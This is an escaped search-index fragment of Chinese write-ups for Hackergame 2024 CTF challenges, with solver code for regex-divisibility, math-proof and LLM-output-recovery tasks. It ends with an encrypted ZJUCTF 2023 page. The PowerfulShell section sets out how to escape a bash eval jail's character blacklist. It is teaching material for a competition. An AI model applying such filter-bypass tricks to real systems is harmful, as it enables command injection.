167 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024","title":"Hackergame 2024"},{"location":"writeups/hackergame2024/#_1","text":"\u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5","title":"\u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86"},{"location":"writeups/hackergame2024/#powerfulshell","text":"\u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002","title":"PowerfulShell"},{"location":"writeups/hackergame2024/#_2","text":"\u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:)","title":"\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"writeups/hackergame2024/#_3","text":"\u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive ()","title":"\u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f"},{"location":"writeups/hackergame2024/#_4","text":"\u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11","title":"\u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6"},{"location":"writeups/hackergame2024/#_5","text":"\u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002","title":"\u96f6\u77e5\u8bc6\u6570\u72ec"},{"location":"writeups/hackergame2024/#llm-hackergame","text":"\u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"\u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d"},{"location":"writeups/zjuctf2023/","text":"elXRXfQBTt0fFq/DoVJ2KA==;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;^","title":"\ud83d\udd12 ZJUCTF 